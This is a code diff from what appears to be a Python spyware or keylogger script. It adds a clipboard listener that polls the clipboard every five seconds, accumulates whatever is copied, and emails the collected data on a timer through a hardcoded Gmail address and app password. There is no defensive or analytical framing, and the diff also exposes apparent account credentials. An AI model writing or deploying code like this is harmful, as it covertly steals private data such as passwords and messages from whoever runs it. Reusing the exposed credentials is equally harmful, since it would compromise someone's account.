@@ -53,6 +53,17 @@ if not os.path.exists('datafile.txt'):
     with open('datafile.txt', 'a') as clip:
         pass
 
+def clipboard_listener():
+    global temp_data, clipboard_data
+    # print(temp_data)
+    if temp_data != pyperclip.paste():
+        temp_data = pyperclip.paste()
+        clipboard_data += f'\n\n{pyperclip.paste()}'
+        print(f'clipboard data: {clipboard_data}')
+    mytimer = Timer(interval=5, function = clipboard_listener)
+    mytimer.daemon = True
+    mytimer.start()      
+
 def isdataavailable():
     print('in data available function... ')
     with open('datafile.txt', 'r+') as f:
@@ -77,28 +88,17 @@ def isdataavailable():
             except:
                 isdataavailable()
         else:
-            pass        
+            print('data not available')    
 
 
-clipboard_data = ''
-
-def clipboard_listener():
-    global temp_data, clipboard_data
-    if temp_data != pyperclip.paste():
-        temp_data = pyperclip.paste()
-        # with open('clipboard.txt', 'a') as clip:
-        #     clip.write(f'\n\n{pyperclip.paste()}')
-        clipboard_data += f'\n\n{pyperclip.paste()}'
-    mytimer = Timer(interval=5, function = clipboard_listener)
-    mytimer.daemon = True
-    mytimer.start()        
+clipboard_data = ''  
 
 def main_func():
     clipboard_listener()
     print('main function started')
     global clipboard_data
     isdataavailable()
-    SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
+    SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
     EMAIL_ADDRESS = "007711meenakshi@gmail.com"
     EMAIL_PASSWORD = "tqbnkgbxprgppuim" #gmail pass => 12345ghjkl@1
     # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
@@ -209,6 +209,7 @@ def main_func():
             except:
                 with open('datafile.txt', 'a') as f:
                     f.write(msg.as_string())
+                clipboard_data = ''
                 isdataavailable()
         def report(self):
             # if self.log:
